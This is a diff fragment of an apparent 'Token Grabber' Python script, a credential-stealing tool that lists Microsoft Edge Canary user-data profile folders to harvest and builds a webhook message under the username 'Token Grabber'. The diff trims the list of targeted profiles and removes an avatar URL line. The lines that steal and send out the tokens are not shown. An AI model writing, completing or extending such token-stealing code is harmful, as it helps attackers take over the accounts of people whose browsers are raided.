@@ -48,11 +48,7 @@ PATHS = {
     "Microsoft Edge Canary Profile 2": LOCAL + "\\Microsoft\\Edge SxS\\User Data\\Profile 2",
     "Microsoft Edge Canary Profile 3": LOCAL + "\\Microsoft\\Edge SxS\\User Data\\Profile 3",
     "Microsoft Edge Canary Profile 4": LOCAL + "\\Microsoft\\Edge SxS\\User Data\\Profile 4",
-    "Microsoft Edge Canary Profile 5": LOCAL + "\\Microsoft\\Edge SxS\\User Data\\Profile 5",
-    "Microsoft Edge Canary Profile 6": LOCAL + "\\Microsoft\\Edge SxS\\User Data\\Profile 6",
-    "Microsoft Edge Canary Profile 7": LOCAL + "\\Microsoft\\Edge SxS\\User Data\\Profile 7",
-    "Microsoft Edge Canary Profile 8": LOCAL + "\\Microsoft\\Edge SxS\\User Data\\Profile 8",
-    "Microsoft Edge Canary Profile 9": LOCAL + "\\Microsoft\\Edge SxS\\User Data\\Profile 9"
+    "Microsoft Edge Canary Profile 5": LOCAL + "\\Microsoft\\Edge SxS\\User Data\\Profile 5"
 }
 
 def slowprint(str):
@@ -268,7 +264,6 @@ def main():
         "content": "",
         "embeds": embeds,
         "username": "Token Grabber",
-        "avatar_url": "https://mehmetcanyildiz.com/wp-content/uploads/2020/11/black.png"
     }
     try:
         
